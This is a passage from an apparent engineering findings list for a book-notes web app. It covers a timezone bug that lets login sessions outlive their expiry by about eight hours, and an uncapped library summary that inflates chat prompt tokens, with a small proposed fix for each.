**What:** `resolve_user_from_token()` at `app_server.py:1473` executes `conn.execute("UPDATE sessions SET last_seen_at = ? WHERE token = ?", (now_iso(), token))`. `now_iso()` returns naive local time (e.g. `2026-06-12T22:00:00` on UTC+8). `gc_expired_sessions()` at `app_server.py:1481` computes its deletion cutoff as `utc_iso_z_from_epoch(time.time() - days * 86400)` — a UTC-naive-Z string (e.g. `2026-05-13T14:00:00.000000Z`). The SQL comparison `DELETE FROM sessions WHERE last_seen_at < cutoff` compares these two different-timezone strings lexicographically. On UTC+8, naive-local strings are 8h "ahead" of their UTC equivalents (`T22:00` vs `T14:00Z`), so sessions on UTC+8 always appear `+8h` fresher than they actually are — they survive approximately 8 hours past their intended expiry window before GC removes them.

**Why it matters:** Sessions that should expire at T continue to work until T+8h on UTC+8 servers. For the 30-day `SESSION_LIFETIME_DAYS`, the effective session window is 30 days 8 hours instead of 30 days. While low-severity, this is the last remaining naive-time write in the authentication critical path, and it interacts directly with the GC system. Migrating to `utc_now_iso()` (1-character change from `now_iso`) also pairs naturally with E23's threshold-write proposal (reduce write frequency by adding `if time.time() - last_seen_epoch > 300:` guard), so both fixes can land together.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:1473`. Optionally add the 300-second guard from E23 in the same diff. Touch: `app_server.py:1473`.

**Files:** `app_server.py:1473` (`resolve_user_from_token` last_seen_at update); `app_server.py:1466-1474` (session expiry + update block)

---

### E74 — `PromptBuilder.all_books_summary` injected without count limit — 500-book users pay ~8,000 extra tokens per chat request (S)

**What:** `PromptBuilder.build_chat_prompt()` at `app_server.py:2326-2329` always injects `all_books_summary` as the full list of every book in the user's library: `[{"id": b.get("id"), "title": b.get("title"), "author": b.get("author", "")} for b in user_state.get("books", [])]` — no limit. OPT-020 already addressed a similar waste (`existing_connections[:20]` conditionally excluded for book/quote context) but did not cap `all_books_summary`. A power user with 500 books injects ~500 × 3 fields: assuming 16-char IDs, 25-char titles, 15-char authors = ~56 chars per entry × 500 = 28,000 chars ≈ 7,000 tokens added to every chat system prompt, unconditionally. The system instructions (lines 2359, 2363) reference `all_books_summary` IDs only for `link_thought` target selection — and OPT-020's rationale was that `link_thought` is only generated when the user explicitly asks. The `all_books_summary` is therefore wasted for 80%+ of requests in the same way `existing_connections` was.

**Why it matters:** OPT-020 reduced per-request token waste by ~150 tokens and was shipped immediately as a cost saving. The `all_books_summary` issue is proportionally larger: a 500-book user wastes 7,000 tokens/request × 240 requests/day = 1,680,000 tokens/day in redundant book summaries. The fix is the same conditional pattern as OPT-020: cap at `[:50]` (enough for `link_thought` target selection) and only include books beyond the current one for the `link_thought` use case. Alternatively, inject only `{"count": N}` plus the top-10 most-recently-active books as a minimal summary when no `link_thought` use is expected.

**Complexity:** S — change `app_server.py:2326-2329` to cap `all_books_summary` at the 50 most-recently-active books: `[...books_sorted_by_recency...][:50]`. For extra savings, exclude the current book from `all_books_summary` (it's already in the `book` field). This is a 2-line change with zero behavior change for the 95%+ of users with fewer than 50 books. Touch: `app_server.py:2326-2329`.

**Files:** `app_server.py:2312-2331` (`PromptBuilder.build_chat_prompt`); no test changes needed.
